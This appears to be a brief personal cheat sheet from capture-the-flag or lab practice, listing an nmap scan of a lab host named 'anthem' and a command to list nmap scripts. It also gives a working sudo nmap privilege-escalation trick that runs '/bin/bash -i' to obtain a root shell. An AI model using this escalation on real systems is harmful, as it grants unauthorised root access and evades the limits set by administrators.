#used to gain root shell with nmap
TF=$(mktemp)
echo 'os.execute("/bin/bash -i")' > $TF
sudo nmap --script=$TF

#used on the anthem box
nmap -vv --reason -Pn -sV -sC --version-all 10.10.31.161

List of the Script engine scripts
```
ls /usr/share/nmap/scripts
```
